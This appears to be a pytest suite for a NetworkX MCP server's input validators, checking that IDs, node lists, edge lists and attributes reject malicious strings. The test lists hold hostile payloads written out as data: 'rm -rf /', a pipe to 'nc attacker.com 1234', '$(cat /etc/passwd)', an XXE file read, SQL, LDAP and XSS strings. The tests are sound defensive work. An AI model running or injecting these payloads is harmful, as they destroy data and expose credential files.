"""Test security input validation against malicious inputs."""

import pytest

from src.networkx_mcp.security.input_validation import (
    ValidationError,
    sanitize_value,
    validate_attributes,
    validate_edge_list,
    validate_graph_type,
    validate_id,
    validate_node_list,
)


class TestMaliciousInputs:
    """Test validation against various malicious inputs."""

    def test_path_traversal_attempts(self):
        """Test that path traversal attempts are blocked."""
        malicious_ids = [
            "../../../etc/passwd",
            "../../config/secrets",
            "..\\..\\windows\\system32",
            "graph/../../../etc/passwd",
            "node/../../secret",
        ]

        for malicious_id in malicious_ids:
            with pytest.raises(ValidationError) as exc_info:
                validate_id(malicious_id)
            assert "invalid characters" in str(
                exc_info.value
            ) or "dangerous content" in str(exc_info.value)

    def test_sql_injection_attempts(self):
        """Test that SQL injection attempts are blocked."""
        sql_injections = [
            "'; DROP TABLE graphs;--",
            "1' OR '1'='1",
            "admin'--",
            "'; DELETE FROM nodes WHERE '1'='1",
            "UNION SELECT * FROM users--",
        ]

        for injection in sql_injections:
            with pytest.raises(ValidationError) as exc_info:
                validate_id(injection)
            assert "invalid characters" in str(
                exc_info.value
            ) or "dangerous content" in str(exc_info.value)

    def test_command_injection_attempts(self):
        """Test that command injection attempts are blocked."""
        command_injections = [
            "graph; rm -rf /",
            "node && cat /etc/passwd",
            "edge | nc attacker.com 1234",
            "$(whoami)",
            "`id`",
        ]

        for injection in command_injections:
            with pytest.raises(ValidationError) as exc_info:
                validate_id(injection)
            assert "invalid characters" in str(
                exc_info.value
            ) or "dangerous content" in str(exc_info.value)

    def test_null_byte_injection(self):
        """Test that null byte injection is blocked."""
        null_byte_inputs = [
            "file.txt\x00.jpg",
            "graph\x00admin",
            "node\x00\x00",
        ]

        for injection in null_byte_inputs:
            with pytest.raises(ValidationError) as exc_info:
                validate_id(injection)
            assert "dangerous content" in str(exc_info.value)

    def test_crlf_injection(self):
        """Test that CRLF injection is blocked."""
        crlf_inputs = [
            "graph\r\nSet-Cookie: admin=true",
            "node\nLocation: http://evil.com",
            "edge\r\n\r\n<script>alert(1)</script>",
        ]

        for injection in crlf_inputs:
            with pytest.raises(ValidationError) as exc_info:
                validate_id(injection)
            assert "dangerous content" in str(exc_info.value)

    def test_oversized_inputs(self):
        """Test that oversized inputs are rejected."""
        # ID too long
        long_id = "a" * 101
        with pytest.raises(ValidationError) as exc_info:
            validate_id(long_id)
        assert "exceeds maximum length" in str(exc_info.value)

        # Too many nodes
        many_nodes = list(range(1001))
        with pytest.raises(ValidationError) as exc_info:
            validate_node_list(many_nodes, max_nodes=1000)
        assert "Too many nodes" in str(exc_info.value)

        # Too many edges
        many_edges = [[i, i + 1] for i in range(10001)]
        with pytest.raises(ValidationError) as exc_info:
            validate_edge_list(many_edges, max_edges=10000)
        assert "Too many edges" in str(exc_info.value)

    def test_html_script_injection(self):
        """Test that HTML/script injection is blocked."""
        html_injections = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
            "<iframe src='evil.com'>",
        ]

        for injection in html_injections:
            with pytest.raises(ValidationError) as exc_info:
                validate_id(injection)
            assert "invalid characters" in str(
                exc_info.value
            ) or "dangerous content" in str(exc_info.value)

    def test_attribute_injection(self):
        """Test that dangerous attributes are sanitized."""
        dangerous_attrs = {
            "onclick": "alert(1)",
            "src": "javascript:alert(1)",
            "../secret": "value",
            "'; DROP TABLE--": "value",
        }

        with pytest.raises(ValidationError) as exc_info:
            validate_attributes(dangerous_attrs)
        assert "dangerous content" in str(exc_info.value)

    def test_nested_attack_vectors(self):
        """Test nested/encoded attack attempts."""
        # Nested lists with malicious content
        nested_nodes = [
            ["valid_node", "../etc/passwd"],
            ["'; DROP TABLE graphs;--", "node2"],
        ]

        with pytest.raises(ValidationError):
            validate_node_list(nested_nodes)

        # Edges with malicious nodes
        malicious_edges = [
            ["../../../etc/passwd", "node2"],
            ["node1", "'; DELETE FROM graphs;--"],
        ]

        with pytest.raises(ValidationError):
            validate_edge_list(malicious_edges)

    def test_valid_inputs_pass(self):
        """Test that valid inputs are accepted."""
        # Valid IDs
        valid_ids = [
            "graph1",
            "node_123",
            "edge-456",
            "Valid_ID-789",
            "a" * 100,  # Max length
        ]

        for valid_id in valid_ids:
            result = validate_id(valid_id)
            assert result == valid_id

        # Valid integers
        assert validate_id(123) == "123"
        assert validate_id(0) == "0"

        # Valid nodes
        valid_nodes = ["node1", "node2", 123, 456]
        result = validate_node_list(valid_nodes)
        assert len(result) == 4

        # Valid edges
        valid_edges = [
            ["node1", "node2"],
            [123, 456],
            ["a", "b", {"weight": 1.5}],
        ]
        result = validate_edge_list(valid_edges)
        assert len(result) == 3

    def test_sanitize_dangerous_values(self):
        """Test value sanitization."""
        # String with injection attempt
        with pytest.raises(ValidationError):
            sanitize_value("'; DROP TABLE--")

        # Oversized string
        with pytest.raises(ValidationError):
            sanitize_value("x" * 1001)

        # Valid values should pass
        assert sanitize_value("valid string") == "valid string"
        assert sanitize_value(123) == 123
        assert sanitize_value(45.67) == 45.67
        assert sanitize_value(True) is True
        assert sanitize_value(None) is None

        # Lists and dicts
        assert sanitize_value([1, 2, 3]) == [1, 2, 3]
        assert sanitize_value({"key": "value"}) == {"key": "value"}

    def test_graph_type_validation(self):
        """Test graph type validation."""
        # Valid types
        assert validate_graph_type("undirected") == "undirected"
        assert validate_graph_type("DIRECTED") == "directed"
        assert validate_graph_type(" multi ") == "multi"

        # Invalid types
        with pytest.raises(ValidationError):
            validate_graph_type("custom_graph")

        with pytest.raises(ValidationError):
            validate_graph_type("'; DROP TABLE--")


def test_malicious_inputs_comprehensive():
    """Run comprehensive tests with various malicious payloads."""
    # Common attack payloads
    attack_payloads = [
        # Path traversal
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        # SQL injection
        "' OR 1=1--",
        "'; DROP TABLE users;--",
        "admin'--",
        '" OR ""="',
        # Command injection
        "; ls -la",
        "| whoami",
        "& net user",
        "$(cat /etc/passwd)",
        "`id`",
        # XSS attempts
        "<script>alert('XSS')</script>",
        "javascript:alert(1)",
        "<img src=x onerror=alert(1)>",
        # LDAP injection
        "*)(uid=*",
        "admin)(&(password=*))",
        # XML injection
        "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>",
        # NoSQL injection
        "{'$gt': ''}",
        "[$ne]=1",
    ]

    # All payloads should be rejected
    for payload in attack_payloads:
        with pytest.raises(ValidationError):
            validate_id(payload)

        # Also test in node lists
        with pytest.raises(ValidationError):
            validate_node_list([payload])

        # And in edges
        with pytest.raises(ValidationError):
            validate_edge_list([[payload, "node2"]])

        with pytest.raises(ValidationError):
            validate_edge_list([["node1", payload]])


if __name__ == "__main__":
    # Run tests
    pytest.main([__file__, "-v"])
